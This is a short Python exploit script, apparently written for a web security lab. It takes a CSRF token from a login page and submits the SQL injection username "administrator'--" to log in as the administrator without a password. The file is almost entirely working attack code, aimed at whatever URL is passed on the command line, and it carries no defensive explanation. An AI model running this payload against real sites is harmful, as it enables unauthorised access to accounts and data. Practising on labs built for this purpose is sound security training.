#Get login bypass access via comments '--
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
	r = s.get(url, verify=False)
	soup = BeautifulSoup(r.text, 'html.parser')
	csrf = soup.find('input', {'name':'csrf'})['value']
	return csrf

def sqli_payload(s, url):
	csrf = get_csrf_token(s, url)
	data = {'csrf': csrf, 'username': "administrator'--", 'password': 'anything'}
	r = s.post(url, data=data, verify=False)
	if "Log out" in r.text:
		return True
	else:		return False

if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
		url_final = url + 'login'
	except IndexError:
		print(f'\033[31m[-] Usage: {sys.argv[0]} <url>\033[0m')
		print(f'\033[31m[-] Example: {sys.argv[0]} www.example.com\033[0m')
		sys.exit(1)

	s = requests.Session()

	try:
		if sqli_payload(s, url_final):
			print('\033[32m[+] SQLi successful! We have logged in as the administrator user.!\033[0m')
		else:
			print('\033[31m[-] SQLi unsuccessful\033[0m')
	except KeyboardInterrupt:
		print('\n\033[33m[+] Exited...\033[0m')
		sys.exit(0)
